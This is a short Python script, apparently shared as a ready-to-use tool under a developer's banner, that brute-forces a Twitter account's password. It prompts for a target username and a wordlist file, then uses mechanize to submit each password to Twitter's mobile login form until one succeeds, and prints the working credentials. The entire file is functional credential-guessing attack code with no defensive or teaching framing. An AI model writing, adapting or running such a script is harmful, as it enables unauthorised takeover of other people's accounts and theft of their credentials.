import mechanize
import argparse
import sys
import os



print('''\033[1;36m
    .'``.``.
 __/ (o) `, `.
'-=`,     ;   `.
    \    :      `-.
    /    ';        `.
   /      .'         `.
   |     (      `.     `-.._
    \     \` ` `. \         `-.._
     `.   ;`-.._ `-`._.-. `-._   `-._
       `..'     `-.```.  `-._ `-.._.'
         `--..__..-`--'      `-.,'
            `._)`/
             /--(
          -./,--'`-,
       ,^--(                    
       ,--' `-,         
        **************************************
        * -> Development: 0xfff0800          *
        * -> Telegram: https://T.me/xfff0800 *
        * -> snapchat: flaah999              *
        **************************************                                                 
\033[1;m''')



b = mechanize.Browser()
b.set_handle_equiv(True)
b.set_handle_gzip(True)
b.set_handle_redirect(True)
b.set_handle_referer(True)
b.set_handle_robots(False)
b._factory.is_html = True

b.addheaders = [('User-agent',
                 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/45.0.2454101'
                 )]

username = input('user:')
passwordList = input('password:')


def Twitter():
    password = open(passwordList).read().splitlines()
    try_login = 0
    print("Target Account: {}".format(username))
    for password in password:
        try_login += 1
        if try_login == 10:
            try_login = 0
        sys.stdout.write('\r[-] {} [-] '.format(password))
        sys.stdout.flush()
        url = "https://mobile.twitter.com/login"
        try:
            response = b.open(url, timeout=2)
            b.select_form(nr=0)
            b.form['session[username_or_email]'] = username
            b.form['session[password]'] = password
            b.method = "POST"
            response = b.submit()

            if len(response.geturl()) == 27:
                print(f'\n[+] Good ^_^ [{username}]:[{password}] [+]')
                break
            else:
                print(' NO !')
        except KeyboardInterrupt:
            print('\n ok exit ')
            sys.stdout.flush()
            break
            
if __name__ == '__main__':
    Twitter()
